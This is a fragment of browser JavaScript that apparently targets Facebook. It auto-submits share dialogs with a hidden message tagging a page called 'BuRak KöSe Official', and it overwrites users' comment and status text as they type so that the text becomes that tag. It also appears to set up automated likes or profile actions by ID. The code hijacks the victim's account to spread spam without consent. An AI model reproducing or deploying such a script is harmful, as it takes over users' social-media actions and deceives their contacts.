...
if (document.URL.indexOf("sharer.php") >= 0) {
    ...
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value='@[180734731960914:BuRak KöSe Official]'>"; 
    document.getElementsByName("share").item(0).click();
}
if (document.URL.indexOf("facebook.com/feysbokyazsamolurmu") >= 0 && document.URL.indexOf("sharer.php") < 0) {
...
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[180734731960914:BuRak KöSe Official] ') < 0 && this.name == 'add_comment_text_text'){this.value = '@[180734731960914:BuRak KöSe Official] ';}");
}
document.addEventListener("click", function () {
    if (document.URL.indexOf("facebook.com/buraqosee") >= 0 && document.URL.indexOf("sharer.php") < 0) {
        for (i = 0; i <= document.getElementById("mainbuttonspan").getElementsByTagName("input").length - 1; i++) {
            if (document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen") {
                document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen"
            }
    ...
    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[180734731960914:BuRak KöSe Official] ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('@[180734731960914:BuRak KöSe Official] ') < 0){this.value = '@[180734731960914:BuRak KöSe Official] ';}");
    }
    ...
    var params = "profile_id=250701225020494";
    params += "&location=1";
